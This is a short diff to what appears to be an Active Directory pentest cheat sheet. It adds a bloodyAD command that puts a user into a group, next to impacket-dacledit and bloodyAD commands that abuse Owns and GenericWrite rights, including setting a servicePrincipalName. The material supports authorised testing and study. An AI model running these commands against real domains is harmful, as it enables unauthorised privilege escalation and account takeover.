@@ -478,6 +478,7 @@ bloodyAD --dc-ip $TARGET --host $DC -d $DOM -k add groupMember 'DistinguishedNam
 
 +---------- Owns ----------+
 impacket-dacledit -dc-ip $TARGET $DOM/ -k -action 'write' -rights 'WriteMembers' -principal '$USERNAME' -target-dn 'DistinguishedName'
+bloodyAD --dc-ip $TARGET --host $DC -d $DOM -k add groupMember 'DistinguishedName' '$USERNAME'
 
 +---------- GenericWrite ----------+
 bloodyAD --dc-ip $TARGET --host $DC -d $DOM -k set object 'DistinguishedName' servicePrincipalName -v 'http/anything'
